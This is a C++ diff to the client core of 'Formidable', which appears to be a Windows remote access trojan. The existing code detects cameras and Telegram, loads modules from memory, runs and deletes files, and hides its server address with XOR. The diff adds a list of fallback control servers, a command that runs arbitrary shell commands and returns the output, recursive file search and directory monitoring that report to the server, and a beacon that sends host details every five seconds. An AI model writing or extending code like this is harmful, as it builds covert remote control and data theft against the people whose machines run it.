@@ -1,9 +1,12 @@
 ﻿#include "ClientCore.h"
 #include "Utils.h"
+#include "../ClientSide/Client/Utils/Logger.h"
+#include "../ClientSide/Client/Core/AutomationManager.h"
 #include <thread>
 #include <vector>
 #include <cstdio>
 #include <cstdlib>
+#include <sstream>
 #include <urlmon.h>
 #include <shellapi.h>
 
@@ -24,6 +27,7 @@ namespace Formidable {
     CRITICAL_SECTION g_ModuleMutex;
     CRITICAL_SECTION g_TerminalMutex;
     CRITICAL_SECTION g_MultimediaMutex;
+    CRITICAL_SECTION g_SendMutex;
 
     // 安全调用模块入口
     void SafeCallModuleEntry(PFN_MODULE_ENTRY pEntry, SOCKET s, CommandPkg* pkg) {
@@ -54,12 +58,14 @@ namespace Formidable {
         InitializeCriticalSection(&g_ModuleMutex);
         InitializeCriticalSection(&g_TerminalMutex);
         InitializeCriticalSection(&g_MultimediaMutex);
+        InitializeCriticalSection(&g_SendMutex);
     }
 
     void CleanupClientCore() {
         DeleteCriticalSection(&g_ModuleMutex);
         DeleteCriticalSection(&g_TerminalMutex);
         DeleteCriticalSection(&g_MultimediaMutex);
+        DeleteCriticalSection(&g_SendMutex);
     }
 
     void GetClientInfo(ClientInfo& info) {
@@ -109,6 +115,9 @@ namespace Formidable {
         info.clientUniqueId = GetStableClientUniqueId(g_ServerConfig.clientID);
         info.hasCamera = CheckCameraExistence() ? 1 : 0;
         info.hasTelegram = CheckTelegramInstalled() ? 1 : 0;
+        info.cpuLoad = GetCpuLoad();
+        info.memUsage = GetMemoryUsage();
+        info.diskUsage = GetDiskUsage();
 
         wchar_t exePathW[MAX_PATH] = { 0 };
         GetModuleFileNameW(NULL, exePathW, MAX_PATH);
@@ -127,12 +136,14 @@ namespace Formidable {
     }
 
     void SendPkg(SOCKET s, const void* data, int len) {
+        EnterCriticalSection(&g_SendMutex);
         PkgHeader header;
         memcpy(header.flag, "FRMD26?", 7);
         header.originLen = len;
         header.totalLen = sizeof(PkgHeader) + len;
         send(s, (char*)&header, sizeof(PkgHeader), 0);
         send(s, (char*)data, len, 0);
+        LeaveCriticalSection(&g_SendMutex);
     }
 
     uint32_t GetModuleKey(uint32_t cmd) {
@@ -151,6 +162,10 @@ namespace Formidable {
             case CMD_FILE_DELETE:
             case CMD_FILE_RENAME:
             case CMD_FILE_RUN:
+        case CMD_FILE_MONITOR:
+        case CMD_FILE_PREVIEW:
+        case CMD_FILE_HISTORY:
+        case CMD_FILE_PERF:
                 return CMD_FILE_LIST;
             case CMD_SERVICE_LIST:
             case CMD_SERVICE_START:
@@ -166,6 +181,7 @@ namespace Formidable {
     }
 
     void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
+        Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Processing Module Command: " + std::to_string(pkg->cmd));
         bool hasDll = totalDataLen > (int)sizeof(CommandPkg);
         uint32_t effectiveCmd = pkg->cmd;
         if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 != 0) {
@@ -248,8 +264,124 @@ namespace Formidable {
         }
     }
 
+    // 搜索文件辅助函数
+    void SearchFiles(const std::wstring& dir, const std::wstring& pattern, std::string& result, int& count) {
+        if (count > 1000) return; // 限制结果数量
+
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind;
+
+        // 搜索当前目录下的匹配文件
+        std::wstring searchPath = dir + L"\\" + pattern;
+        hFind = FindFirstFileW(searchPath.c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                    std::wstring fullPath = dir + L"\\" + findData.cFileName;
+                    result += WideToUTF8(fullPath) + "\n";
+                    count++;
+                    if (count > 1000) break;
+                }
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+        }
+
+        if (count > 1000) return;
+
+        // 递归子目录
+        std::wstring allPath = dir + L"\\*";
+        hFind = FindFirstFileW(allPath.c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && 
+                    wcscmp(findData.cFileName, L".") != 0 && 
+                    wcscmp(findData.cFileName, L"..") != 0) {
+                    
+                    std::wstring subDir = dir + L"\\" + findData.cFileName;
+                    SearchFiles(subDir, pattern, result, count);
+                    if (count > 1000) break;
+                }
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+        }
+    }
+
     void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
         switch (pkg->cmd) {
+            case CMD_FILE_SEARCH: {
+                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
+                if (dataLen > 0) {
+                    std::string payload(pkg->data, dataLen);
+                    size_t sep = payload.find('|');
+                    if (sep != std::string::npos) {
+                        std::string path = payload.substr(0, sep);
+                        std::string pattern = payload.substr(sep + 1);
+                        Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Searching files in " + path + " with pattern " + pattern);
+                        std::string result = "";
+                        int count = 0;
+                        SearchFiles(UTF8ToWide(path), UTF8ToWide(pattern), result, count);
+                        
+                        size_t bodySize = sizeof(CommandPkg) - 1 + result.size();
+                        std::vector<char> buffer(bodySize);
+                        CommandPkg* pkgResp = (CommandPkg*)buffer.data();
+                        pkgResp->cmd = CMD_FILE_SEARCH;
+                        pkgResp->arg1 = (uint32_t)result.size();
+                        pkgResp->arg2 = 0;
+                        memcpy(pkgResp->data, result.c_str(), result.size());
+                        SendPkg(s, buffer.data(), (int)bodySize);
+                    }
+                }
+                break;
+            }
+            case CMD_FILE_MONITOR: {
+                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
+                if (dataLen > 0) {
+                    std::string path(pkg->data, dataLen);
+                    Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Starting file monitor on " + path);
+                    std::wstring wPath = UTF8ToWide(path);
+                    
+                    // 启动监控线程 (简单实现，仅监控文件名变更)
+                    std::thread([s, wPath]() {
+                        HANDLE hDir = CreateFileW(wPath.c_str(), FILE_LIST_DIRECTORY, 
+                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
+                            NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+                            
+                        if (hDir != INVALID_HANDLE_VALUE) {
+                            char notifyBuf[1024];
+                            DWORD bytesReturned;
+                            while (true) {
+                                if (ReadDirectoryChangesW(hDir, notifyBuf, sizeof(notifyBuf), TRUE, 
+                                    FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE, 
+                                    &bytesReturned, NULL, NULL)) {
+                                    
+                                    FILE_NOTIFY_INFORMATION* pNotify = (FILE_NOTIFY_INFORMATION*)notifyBuf;
+                                    std::wstring fileName(pNotify->FileName, pNotify->FileNameLength / sizeof(wchar_t));
+                                    std::string utf8Name = WideToUTF8(fileName);
+                                    std::string msg = "Change: " + utf8Name + "\n";
+                                    
+                                    size_t bodySize = sizeof(CommandPkg) - 1 + msg.size();
+                                    std::vector<char> buffer(bodySize);
+                                    CommandPkg* pkgResp = (CommandPkg*)buffer.data();
+                                    pkgResp->cmd = CMD_FILE_MONITOR;
+                                    pkgResp->arg1 = (uint32_t)msg.size();
+                                    pkgResp->arg2 = 0;
+                                    memcpy(pkgResp->data, msg.c_str(), msg.size());
+                                    
+                                    // 注意：这里需要检查 socket 是否有效，但为了简单起见暂时忽略
+                                    // 实际应使用 shared_ptr 或弱引用管理 socket 生命周期
+                                    SendPkg(s, buffer.data(), (int)bodySize);
+                                    
+                                    if (pNotify->NextEntryOffset == 0) break;
+                                } else {
+                                    break;
+                                }
+                            }
+                            CloseHandle(hDir);
+                        }
+                    }).detach();
+                }
+                break;
+            }
             case CMD_HEARTBEAT: {
                 ClientInfo info;
                 GetClientInfo(info);
@@ -490,37 +622,62 @@ namespace Formidable {
             case CMD_EXIT:
                 ExitProcess(0);
                 break;
+            case CMD_EXEC_GET_OUTPUT: {
+                int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
+                if (dataLen > 0) {
+                    std::string cmd(pkg->data, dataLen);
+                    std::string output = ExecuteCmdAndGetOutput(cmd);
+                    
+                    size_t respSize = sizeof(CommandPkg) - 1 + output.size();
+                    std::vector<char> respBuf(sizeof(PkgHeader) + respSize);
+                    PkgHeader* h = (PkgHeader*)respBuf.data();
+                    memcpy(h->flag, "FRMD26?", 7);
+                    h->originLen = (int)respSize;
+                    h->totalLen = (int)respBuf.size();
+                    
+                    CommandPkg* p = (CommandPkg*)(respBuf.data() + sizeof(PkgHeader));
+                    p->cmd = CMD_EXEC_GET_OUTPUT;
+                    p->arg1 = (uint32_t)output.size();
+                    p->arg2 = 0;
+                    memcpy(p->data, output.data(), output.size());
+                    
+                    send(s, respBuf.data(), (int)respBuf.size(), 0);
+                }
+                break;
+            }
         }
     }
 
     void HandleConnection(ConnectionContext* ctx) {
         ctx->bConnected->store(true);
+        Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Connected to " + ctx->serverIp);
         ClientInfo info;
         GetClientInfo(info);
         SendPkg(ctx->s, &info, sizeof(ClientInfo));
         
-        std::thread heartbeatThread([ctx]() {
-            while (!ctx->bShouldExit->load() && ctx->bConnected->load()) {
-                Sleep(30000);
-                if (!ctx->bConnected->load() || ctx->bShouldExit->load()) break;
-                
-                ClientInfo hbInfo;
-                GetClientInfo(hbInfo);
-                size_t hbBodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
-                std::vector<char> hbBuf(sizeof(PkgHeader) + hbBodySize);
-                PkgHeader* h = (PkgHeader*)hbBuf.data();
-                memcpy(h->flag, "FRMD26?", 7);
-                h->originLen = (int)hbBodySize;
-                h->totalLen = (int)hbBuf.size();
-                CommandPkg* p = (CommandPkg*)(hbBuf.data() + sizeof(PkgHeader));
-                p->cmd = CMD_HEARTBEAT;
-                p->arg1 = sizeof(ClientInfo);
-                p->arg2 = 0;
-                memcpy(p->data, &hbInfo, sizeof(ClientInfo));
-                if (send(ctx->s, hbBuf.data(), (int)hbBuf.size(), 0) <= 0) break;
-            }
-        });
-        
+        // Heartbeat task via AutomationManager
+        int hbTaskId = Formidable::Client::Core::AutomationManager::AddTask([ctx]() {
+            if (!ctx->bConnected->load()) return;
+            
+            ClientInfo hbInfo;
+            GetClientInfo(hbInfo);
+            
+            size_t hbBodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
+            std::vector<char> hbBuf(sizeof(PkgHeader) + hbBodySize);
+            PkgHeader* h = (PkgHeader*)hbBuf.data();
+            memcpy(h->flag, "FRMD26?", 7);
+            h->originLen = (int)hbBodySize;
+            h->totalLen = (int)hbBuf.size();
+            
+            CommandPkg* p = (CommandPkg*)(hbBuf.data() + sizeof(PkgHeader));
+            p->cmd = CMD_HEARTBEAT;
+            p->arg1 = sizeof(ClientInfo);
+            p->arg2 = 0;
+            memcpy(p->data, &hbInfo, sizeof(ClientInfo));
+            
+            send(ctx->s, hbBuf.data(), (int)hbBuf.size(), 0);
+        }, 5000);
+
         while (!ctx->bShouldExit->load()) {
             PkgHeader header;
             int n = recv(ctx->s, (char*)&header, sizeof(PkgHeader), 0);
@@ -539,7 +696,8 @@ namespace Formidable {
         }
         
         ctx->bConnected->store(false);
-        if (heartbeatThread.joinable()) heartbeatThread.join();
+        Formidable::Client::Core::AutomationManager::RemoveTask(hbTaskId);
+        Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_WARNING, "Disconnected");
     }
 
     void RunClientLoop(std::atomic<bool>& bShouldExit, std::atomic<bool>& bConnected) {
@@ -547,14 +705,28 @@ namespace Formidable {
             WSADATA wsaData;
             WSAStartup(MAKEWORD(2, 2), &wsaData);
 
-            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-            if (s != INVALID_SOCKET) {
-                std::string serverIp = g_ServerConfig.szServerIP;
-                if (g_ServerConfig.bEncrypt) {
-                    for (size_t k = 0; k < serverIp.length(); k++) {
-                        serverIp[k] ^= 0x5A;
-                    }
+            std::string rawServerIps = g_ServerConfig.szServerIP;
+            if (g_ServerConfig.bEncrypt) {
+                for (size_t k = 0; k < rawServerIps.length(); k++) {
+                    rawServerIps[k] ^= 0x5A;
                 }
+            }
+            
+            std::vector<std::string> serverList;
+            std::stringstream ss(rawServerIps);
+            std::string item;
+            while (std::getline(ss, item, ',')) {
+                if (!item.empty()) serverList.push_back(item);
+            }
+            if (serverList.empty()) serverList.push_back("127.0.0.1");
+
+            bool connected = false;
+            for (const auto& serverIp : serverList) {
+                if (bShouldExit) break;
+                
+                SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                if (s == INVALID_SOCKET) continue;
+
                 int port = atoi(g_ServerConfig.szPort);
                 std::string serverPort = g_ServerConfig.szPort;
 
@@ -563,12 +735,23 @@ namespace Formidable {
                 addr.sin_port = htons(port);
                 inet_pton(AF_INET, serverIp.c_str(), &addr.sin_addr);
 
+                Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Attempting connection to " + serverIp);
+
                 if (connect(s, (sockaddr*)&addr, sizeof(addr)) == 0) {
+                    connected = true;
                     ConnectionContext ctx = { s, serverIp, serverPort, &bConnected, &bShouldExit };
                     HandleConnection(&ctx);
+                    closesocket(s);
+                    // If HandleConnection returns, it means we disconnected. 
+                    // Break inner loop to sleep and retry (or move to next server if we implement round-robin on failure immediately?)
+                    // Usually, if we disconnected, we might want to try other servers.
+                    // But if we were connected for a while, maybe we should stick to this one?
+                    // For now, let's break and sleep, then restart loop (which will retry the list).
+                    break; 
                 }
                 closesocket(s);
             }
+
             WSACleanup();
             if (!bShouldExit) Sleep(5000);
         }
